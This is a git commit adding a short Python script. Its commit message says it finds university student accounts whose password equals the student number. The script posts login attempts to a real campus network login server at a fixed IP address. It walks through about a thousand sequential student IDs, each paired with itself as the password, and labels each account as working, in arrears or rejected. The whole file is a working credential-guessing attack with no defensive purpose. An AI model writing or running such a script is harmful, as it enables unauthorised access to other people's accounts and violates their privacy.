6d17b813004f44a32b48df7a0087e6610ae09740
gsy <1007691667@qq.com>
2017-04-03 13:35:25 +0800

    Create ytu.py
    检查所有ytu学号和密码一致的情况

---
+++ ytu.py
@@ -0,0 +1,34 @@
+#-*-coding:utf-8
+import requests
+from bs4 import BeautifulSoup
+
+url='http://202.194.116.85/cgi-bin/do_login'
+html = requests.get(url).content
+def loop(num):
+    user=str(num)
+    post_data = {'username': user, 'password': user, 'drop': 0, 'type': 1, 'n': '100'}
+    web_data = requests.post(url, data=post_data)
+    if web_data.text=='password_error':
+        print user+': shit\n'
+    elif web_data.text=='status_error':
+        print user+'：欠费\n'
+    else:
+        print user+':可以的\n'
+
+
+    if num>201658503141:
+        exit()
+num=201651502101
+for i in range(1 , 1000):
+    loop(num)
+    num=num+1
+
+
+
+
+
+
+
+
+
+
